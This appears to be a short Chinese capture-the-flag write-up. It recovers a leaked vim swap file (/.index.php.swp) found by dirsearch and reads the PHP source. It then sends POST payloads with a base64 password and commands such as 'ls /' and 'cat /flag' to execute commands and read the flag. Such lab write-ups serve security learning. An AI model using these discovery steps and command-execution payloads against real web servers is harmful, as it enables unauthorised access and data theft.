![img](./assets/wps263.jpg)

vim联想到swp源码泄露

dirsearch扫描

![img](./assets/wps264.jpg) 

 

直接访问/.index.php.swp

下载得到源码

放入kali

执行

Vim -r index.php.swp 修复vim文件

![img](./assets/wps265.jpg) 

查看源码关键

![img](./assets/wps266.jpg) 

 

post传参password和cmd

首先判断password传入的值是否和base64编码后的

![img](./assets/wps267.jpg) 

是否相等

如果相等，执行cmd传入的命令

 

$password传入

![img](./assets/wps268.jpg) 

构造payload：

password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=ls /

 

![img](./assets/wps269.jpg) 

 

查看flag

构造payload：

password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=cat /flag

![img](./assets/wps270.jpg) 

 

 